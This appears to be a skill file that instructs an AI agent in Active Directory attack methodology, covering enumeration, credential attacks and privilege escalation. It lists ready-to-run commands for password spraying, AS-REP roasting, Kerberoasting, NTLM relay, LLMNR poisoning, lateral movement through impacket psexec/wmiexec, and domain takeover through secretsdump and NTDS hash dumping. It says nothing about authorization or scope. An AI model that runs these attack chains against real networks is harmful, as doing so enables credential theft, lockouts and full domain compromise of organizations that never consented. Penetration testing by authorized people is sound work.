---
name: ad-attacks
description: "Active Directory attack methodology: enumeration, credential attacks, delegation abuse, and domain takeover paths. Use this skill as the entry point for AD engagements."
---

# AD Attacks

## Overview

AD compromise is a chain: get a foothold → enumerate → escalate → move laterally → take the domain. Most paths go through misconfigured delegation, weak ACLs, or certificate services.

## Initial foothold

- Phishing → credential
- NTLM relay from a coerced auth
- Weak local admin password reuse
- Exposed service with a known CVE

## Enumeration

```bash
# unauthenticated
enum4linux-ng -A DC
rpcclient -U '' -N DC -c 'enumdomusers'

# authenticated
bloodhound-python -u user -p pass -d domain.local -ns DC -c all
nxc smb DC -u user -p pass --users --groups --shares --sessions
```

## Credential attacks

| Attack | Command |
|---|---|
| Password spray | `nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success` |
| AS-REP roast | `impacket-GetNPUsers domain/ -usersfile u.txt -dc-ip DC -format hashcat` |
| Kerberoast | `impacket-GetUserSPNs domain/user:pass -dc-ip DC -request` |
| NTLM relay | `ntlmrelayx.py -tf targets.txt -smb2support` |
| LLMNR poisoning | `responder -I eth0 -rdw` |

## Privilege escalation paths

| Path | Tool |
|---|---|
| ADCS ESC1-ESC8 | `certipy find` / `certipy req` |
| Unconstrained delegation | coerce a DC to authenticate → capture TGT |
| Constrained delegation | S4U2Self/S4U2Proxy abuse |
| RBCD | write `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| ACL abuse (`GenericAll`, `WriteDACL`, `ForceChangePassword`) | `bloodyAD`, `impacket-dacledit` |
| GPO abuse | `pyGPOAbuse` |
| `msDS-KeyCredentialLink` | `pywhisker` |

## Lateral movement

```bash
impacket-psexec domain/user:pass@target
impacket-wmiexec domain/user:pass@target
impacket-atexec domain/user:pass@target "whoami"
nxc smb target -u user -p pass -x "whoami"
```

## Domain takeover

```bash
impacket-secretsdump domain/admin:pass@DC
# then
nxc smb DC -u administrator -H <hash> --ntds
```

Golden ticket: needs `krbtgt` hash. Silver ticket: needs a service account hash.

## Pitfalls

- Lockout policies turn a spray into a denial of service — check the policy first.
- BloodHound data ages; re-collect after every privilege change.
- EDR on DCs logs `secretsdump` behavior.

## Verification

Every escalation must be proven with an authenticated action as the elevated principal.
